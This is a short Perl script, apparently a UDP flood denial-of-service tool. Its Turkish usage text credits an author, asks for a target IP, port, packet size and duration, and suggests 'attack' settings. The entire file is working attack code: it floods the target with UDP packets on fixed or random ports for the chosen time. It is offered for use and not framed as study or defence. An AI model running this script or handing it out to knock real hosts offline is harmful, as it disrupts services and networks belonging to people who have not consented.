#!/usr/bin/perl

use Socket;
use strict;
 
if ($#ARGV != 3)
{
    print "MBE* - UDP ~ TCP Script"; 
    print "Developed By: Burak Eyidoğan*";
    print "Kullanim : cleyr.pl <ip> <port> <paket> <zaman>\n";
    print "Onerilen Vurulus Sekli : cleyr.pl <ip> <port> <200t> <999>\n";

    exit(1);
}
 
my ($ip, $port, $size, $time) = @ARGV;
 
my ($iaddr, $endtime, $psize, $pport);
 
$iaddr = inet_aton("$ip") or die "$ip Ipye Baglanilamiyor..!\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17); 
 
print "Saldirilan Ip: $ip, Port: " . ($port ? $port : "random") . ", Paket: " .
($size ? "$size-Byte, " : "random size") .
($time ? "Saniye: $time" : "") . "\n";
 
for (;time() <= $endtime;)
{
    $psize = $size ? $size : int(rand(2000-70)+70) ;
    $pport = $port ? $port : int(rand(65500))+1;
    send(flood, pack("a$psize", "MBE Software - PerlDos*"), 0, pack_sockaddr_in($pport, $iaddr));
}
